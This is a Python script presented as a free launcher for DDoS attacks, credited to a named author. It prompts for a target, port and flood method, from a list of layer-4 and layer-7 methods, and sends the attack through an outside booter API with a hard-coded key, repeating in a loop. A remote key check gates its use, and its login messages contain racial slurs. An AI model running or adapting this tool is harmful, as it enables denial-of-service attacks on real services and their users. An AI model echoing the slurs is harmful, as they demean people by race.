#Free Platform for Launching DDoS Attack Using API ( YOU MUST OWN AN API!! )
#Made by iSholvedx
#t.me/iSholvedNVR

import os,time,requests,sys

banner = '''
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░       ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
 ░▒▓██████▓▒░   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
                                                                   
                                                                   
'''

def main():
    #Method List
    list_methodl7 = ["STORM-BYPASS", "FLOODV4", "BROWSER"]
    list_methodl4 = ["DNS-BETA", "RAW-BYPASS", "TFO", "UDP-RANDOM", "ACK", "SOCKET-BYPASS", "OVH-UDP", "UDP-BYPASS", "MIX-UDP", "PPSv3", "GAME", "UDPv2"]
    print(banner)

    #Mode L4/L7

    mode = input("L4 / L7: ").strip().upper()
    if mode == "L4":
        print("Methods List: " + str(list_methodl4))
    elif mode == "L7":
        print("Methods List: " + str(list_methodl7))
    else:
        print("Something Wrong?")

    #Value   

    target = input("Target: ")
    methods = input("Method: ")
    conc = input("Conc: ")
    if int(conc) > 5:
        print("Too Much Conc")
        sys.exit(1)

    #API SYSTEM, JUST CHANGE THE PARAMS

    if methods in list_methodl7:
        while True:
            r = requests.get("https://exampleapi.com/start?api_key=O8dkwglLes&target="+ target +"&user=3449&time=1995&method=" + methods + "&concurrents=" + conc).text
            print(r)
            time.sleep(2000)
    elif methods in list_methodl4:
        port = input("Port: ")
        while True:
            r = requests.get("https://exampleapi.com/start?api_key=O8dkwglLes&target="+ target +"&user=3449&time=1995&method=" + methods + "&port=" + port + "&concurrents=" + conc).text
            print(r)
            time.sleep(2000)
#LOGIN SYSTEM
r = requests.get("https://raw.githubusercontent.com/iSholvedx/LauncherAttackAPI/refs/heads/main/key").text
if r.strip() == "123":
    print("welcome nigga")
    #time.sleep(3)
    if os.name == 'nt':  # For Windows
            os.system('cls')
    else:  # For macOS and Linux
        os.system('clear')
    main()
else:
    print("shutup niggerrrrrrrrrrrrrrr")
    sys.exit(1)